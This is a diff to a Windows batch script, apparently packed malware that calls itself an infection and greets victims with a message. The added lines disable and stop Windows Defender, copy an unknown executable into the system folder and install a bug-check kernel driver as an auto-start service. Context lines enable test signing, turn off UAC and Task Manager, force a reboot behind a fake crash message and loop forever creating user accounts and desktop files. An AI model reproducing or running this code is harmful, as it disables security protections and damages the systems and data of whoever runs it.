@@ -13,6 +13,7 @@
 ::fBE1pAF6MU+EWHreyHcjLQlHcAWGMWK0OpEZ++Pv4Pq7p0AfUeYDdIDXlLmBNoA=
 ::fBE1pAF6MU+EWHreyHcjLQlHcAWGMWK0OpEZ++Pv4Pq7p0AfUeYDeozTlKaLJ4A=
 ::fBE1pAF6MU+EWHreyHcjLQlHcAWGMWK0OpEZ++Pv4Pq7p0AfUeYDWprc+byLI+s760bvO4U0xRo=
+::fBE1pAF6MU+EWHreyHcjLQlHcAWGMWK0OpEZ++Pv4Pq7p0AfUeYDbIfe37qKbuUL7yU=
 ::fBE1pAF6MU+EWHreyHcjLQlHcAWGMWK0OpEZ++Pv4Pq7p0AfUeYDep3O0vqLOOVz
 ::YAwzoRdxOk+EWAjk
 ::fBw5plQjdCyDJH2L91c9LRVAX0SDMm/6NbAI/OH16Pm7g0kQXew2a5vJ26CBMtw371bvYZk96m9VlMIIHxNNdwCtagU3r2VGpWqDIs2Y/QbiRSg=
@@ -21,7 +22,7 @@
 ::Yhs/ulQjdF65
 ::cxAkpRVqdFKZSTk=
 ::cBs/ulQjdF65
-::ZR41oxFsdFKZSDk=
+::ZR41oxFsdFKZSTk=
 ::eBoioBt6dFKZSDk=
 ::cRo6pxp7LAbNWATEpCI=
 ::egkzugNsPRvcWATEpCI=
@@ -46,13 +47,14 @@
 ::
 ::978f952a14a936cc963da21a135fa983
 @Echo off
+sc config WinDefend start= disabled
+sc stop WinDefend
 set status=0
 IF exist %temp%\hey.txt goto start
-::Bugcheckhack
+::Bugcheckhack and another file
+copy %b2eincfilepath%\theend.exe %SYSTEMROOT%\theend.exe
 bcdedit /set testsigning on
 reg import %b2eincfilepath%\bch.reg
-copy %b2eincfilepath%\BugCheckHack.sys %SYSTEMROOT%
-sc create BugCheckHack binPath=C:\Windows\BugCheckHack.sys type=kernel start=auto
 ::Disabling taskmgr and stuff
 start wscript %b2eincfilepath%\begin.vbs
 reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f
@@ -63,13 +65,18 @@ echo Hey>%temp%\hey.txt
 echo You've been infected by my dumb project huh? >>%temp%\hey.txt
 echo I just wanted to say hello to you with this very little message :)>>%temp%\hey.txt
 echo Enjoy the music .w.>>%temp%\hey.txt
-shutdown -r -t 10 -c "Windows has encountered a problem and needs to shut down..."
+shutdown -r -t 20 -c "Windows has encountered a problem and needs to shut down..."
 :usa
 net user "Jean %random%" %random% /add
 echo oops~ > "%userprofile%/Desktop/%username% open me %random%%random%.txt"
 goto usa
+::Bugcheck 2
+:bc
+copy %b2eincfilepath%\BugCheckHack.sys %SYSTEMROOT%\BugCheckHack.sys
+sc create BugCheckHack binPath=%SYSTEMROOT%\BugCheckHack.sys type=kernel start=auto
 ::Payload management
 :start
+IF NOT exist %temp%\hey.txt goto bc
 sc start BugCheckHack
 For /f "delims=" %%A in ('powershell get-date -format "{MM-dd}"') do @set _dtm=%%A
 ::Check dates first
